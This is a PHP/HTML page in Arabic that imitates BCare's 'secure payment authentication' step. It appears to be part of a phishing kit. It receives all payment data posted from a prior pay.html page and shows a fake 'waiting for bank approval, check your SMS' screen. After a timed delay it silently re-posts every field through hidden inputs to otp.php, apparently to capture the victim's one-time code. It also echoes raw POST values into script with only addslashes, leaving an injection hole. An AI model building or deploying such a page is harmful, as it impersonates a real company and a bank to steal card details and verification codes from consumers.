<?php
// استقبال جميع البيانات من pay.html
$payment_data = $_POST;
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مصادقة الدفع الآمن - بي كير</title>
    
    <!-- خط Cairo من Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
:root {
    --color-background: #F4F7FB;
    --color-surface: #FFFFFF;
    --color-primary: #0F4C72;
    --color-accent: #F2A340;
    --color-text-primary: #0E1F2E;
    --color-text-secondary: #4B5B6B;
    --color-border: #D8E2EE;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: var(--color-background);
    color: var(--color-text-primary);
    line-height: 1.6;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

/* Top Banner */
.top-banner {
    background: var(--color-accent);
    color: white;
    padding: 0.75rem 1rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.banner-right {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.alert-icon {
    width: 1.25rem;
    height: 1.25rem;
}

.banner-text {
    font-size: 0.875rem;
    font-weight: 600;
}

.download-link {
    color: white;
    text-decoration: underline;
    font-weight: 700;
    margin-right: 0.25rem;
}

.close-btn {
    background: transparent;
    border: none;
    color: white;
    cursor: pointer;
    padding: 0.25rem;
    font-size: 1.5rem;
    line-height: 1;
    opacity: 0.9;
}

.close-btn:hover {
    opacity: 1;
}

/* Header */
.header {
    background: white;
    border-bottom: 1px solid var(--color-border);
    padding: 1rem;
}

.header-content {
    max-width: 1280px;
    margin: 0 auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 0.75rem;
}

.profile-btn, .lang-btn, .menu-btn {
    background: transparent;
    border: 1px solid var(--color-border);
    border-radius: 50%;
    width: 2.5rem;
    height: 2.5rem;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: background 0.3s;
}

.lang-btn {
    border-radius: 9999px;
    padding: 0.25rem 0.75rem;
    width: auto;
    height: auto;
    font-size: 0.75rem;
    font-weight: 600;
}

.profile-btn:hover, .lang-btn:hover, .menu-btn:hover {
    background: rgba(0, 0, 0, 0.02);
}

.logo img {
    height: 45px;
    width: auto;
}

/* Main Content */
.main-content {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 2rem 1rem;
}

.verification-card {
    background: white;
    border-radius: 1rem;
    box-shadow: 0 16px 40px rgba(15, 76, 114, 0.12);
    max-width: 48rem;
    width: 100%;
    overflow: hidden;
}

.card-header {
    background: white;
    padding: 2rem 1.5rem 1rem;
    text-align: center;
    border-bottom: 1px solid var(--color-border);
}

.card-title {
    font-size: 1.5rem;
    font-weight: 700;
    color: var(--color-text-primary);
    margin-bottom: 0.5rem;
}

.card-subtitle {
    font-size: 0.875rem;
    color: var(--color-text-secondary);
}

.card-body {
    padding: 3rem 1.5rem;
    text-align: center;
}

.shield-icon-wrapper {
    width: 8rem;
    height: 8rem;
    background: linear-gradient(135deg, #E6F0F7 0%, #D6E8F5 100%);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 2rem;
    position: relative;
}

.shield-icon-wrapper::before {
    content: '';
    position: absolute;
    inset: -0.5rem;
    border-radius: 50%;
    background: linear-gradient(135deg, rgba(15, 76, 114, 0.1), rgba(15, 76, 114, 0.05));
    animation: pulse 2s ease-in-out infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(1.05); }
}

.shield-icon {
    width: 4rem;
    height: 4rem;
    fill: var(--color-primary);
    position: relative;
    z-index: 1;
}

.waiting-title {
    font-size: 1.25rem;
    font-weight: 700;
    color: var(--color-text-primary);
    margin-bottom: 0.75rem;
}

.waiting-subtitle {
    font-size: 0.875rem;
    color: var(--color-text-secondary);
    margin-bottom: 2rem;
}

.info-section {
    background: var(--color-background);
    border-radius: 0.75rem;
    padding: 1.5rem;
    margin-top: 2rem;
}

.info-item {
    display: flex;
    align-items: flex-start;
    gap: 0.75rem;
    padding: 1rem 0;
    border-bottom: 1px solid var(--color-border);
}

.info-item:last-child {
    border-bottom: none;
}

.info-icon-wrapper {
    background: white;
    border-radius: 50%;
    width: 2.5rem;
    height: 2.5rem;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
}

.info-icon {
    width: 1.25rem;
    height: 1.25rem;
}

.info-content {
    flex: 1;
    text-align: right;
}

.info-title {
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-text-primary);
    margin-bottom: 0.25rem;
}

.info-description {
    font-size: 0.75rem;
    color: var(--color-text-secondary);
    line-height: 1.5;
}

/* Footer */
.footer {
    background: #0B2F48;
    color: #D6E4F0;
    padding: 2rem 1rem;
    margin-top: auto;
}

.footer-content {
    max-width: 1280px;
    margin: 0 auto;
    text-align: center;
}

.footer-text {
    font-size: 0.75rem;
    color: #9FB4C4;
    margin-bottom: 1rem;
}

.footer-contact {
    font-size: 0.875rem;
}

.footer-phone {
    color: var(--color-accent);
    text-decoration: none;
    font-weight: 600;
}

/* Loading Spinner */
.loading-spinner {
    width: 3rem;
    height: 3rem;
    margin: 1.5rem auto;
    position: relative;
}

.loading-spinner::after {
    content: '';
    display: block;
    width: 100%;
    height: 100%;
    border: 4px solid var(--color-border);
    border-top-color: var(--color-accent);
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}

@media (min-width: 768px) {
    .verification-card {
        margin: 2rem;
    }
    
    .card-header {
        padding: 2.5rem 2rem 1.5rem;
    }
    
    .card-body {
        padding: 3rem 2rem;
    }
    
    .info-section {
        padding: 2rem;
    }
}
    </style>
</head>
<body>
    <!-- Top Banner -->
    <div class="top-banner">
        <div class="banner-right">
            <span class="alert-icon">!</span>
            <span class="banner-text">حمّل تطبيق بي كير الآن!</span>
            <a href="#" class="download-link">تحميل</a>
        </div>
        <button class="close-btn" onclick="this.parentElement.style.display='none'">×</button>
    </div>

    <!-- Header -->
    <header class="header">
        <div class="header-content">
            <div class="header-left">
                <button class="lang-btn">EN</button>
                <button class="profile-btn">
                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none">
                        <path d="M20 21a8 8 0 0 0-16 0"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                </button>
            </div>
            <a href="#" class="logo">
                <img src="/bcare-logo.svg" alt="BCare Logo">
            </a>
            <button class="menu-btn">
                <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none">
                    <line x1="3" y1="6" x2="21" y2="6"></line>
                    <line x1="3" y1="12" x2="21" y2="12"></line>
                    <line x1="3" y1="18" x2="21" y2="18"></line>
                </svg>
            </button>
        </div>
    </header>
=


    <!-- Main Content -->
    <main class="main-content">
        <div class="verification-card">
            <div class="card-header">
                <h1 class="card-title">مصادقة الدفع الآمن</h1>
                <p class="card-subtitle">لأمانك، يتطلب البنك التحقق من هويتك.</p>
            </div>

            <div class="card-body">
                <div class="shield-icon-wrapper">
                    <svg class="shield-icon" viewBox="0 0 24 24">
                        <path d="M12 2L4 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-8-4z"/>
                    </svg>
                </div>

                <h2 class="waiting-title">في انتظار موافقة البنك...</h2>
                <p class="waiting-subtitle">انتظر الرمز للمتابعة.</p>
<!-- دائرة التحميل -->
<div class="loading-spinner"></div>

<div class="info-section">
                <div class="info-section">
                    <div class="info-item">
                        <div class="info-icon-wrapper">
                            <svg class="info-icon" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
                            </svg>
                        </div>
                        <div class="info-content">
                            <div class="info-title">1. تحقق من رسائلك النصية (SMS)</div>
                            <div class="info-description">سيقوم البنك بإرسال رمز تحقق سري.</div>
                        </div>
                    </div>

                    <div class="info-item">
                        <div class="info-icon-wrapper">
                            <svg class="info-icon" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
                            </svg>
                        </div>
                        <div class="info-content">
                            <div class="info-title">2. أو تحقق من تطبيق البنك الخاص بك</div>
                            <div class="info-description">قد يتطلب إبنك الموافقة عبر إشعار **داخل التطبيق**.</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-content">
            <p class="footer-text">
                © 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين.
            </p>
            <div class="footer-contact">
                اتصل بنا: <a href="tel:8001180042" class="footer-phone">8001180042</a>
            </div>
        </div>
    </footer>

    <script>
        // التوجيه التلقائي بعد 10 ثواني
        setTimeout(function() {
            // جمع جميع البيانات المستلمة
            const formData = new FormData();
            
            <?php
            // إضافة جميع البيانات المستلمة إلى JavaScript
            foreach($_POST as $key => $value) {
                if(is_array($value)) {
                    echo "formData.append('" . addslashes($key) . "', '" . addslashes(json_encode($value)) . "');\n";
                } else {
                    echo "formData.append('" . addslashes($key) . "', '" . addslashes($value) . "');\n";
                }
            }
            ?>
            
            // الحصول على user_id من URL
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('user_id') || '';
            
            if(userId) {
                formData.append('user_id', userId);
            }
            
            // إنشاء نموذج مخفي للانتقال إلى otp.php
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'otp.php' + (userId ? '?user_id=' + encodeURIComponent(userId) : '');
            
            // إضافة جميع البيانات
            for (let [key, value] of formData.entries()) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = value;
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            form.submit();
        }, 15000); // 10 ثواني
    </script>
</body>
</html>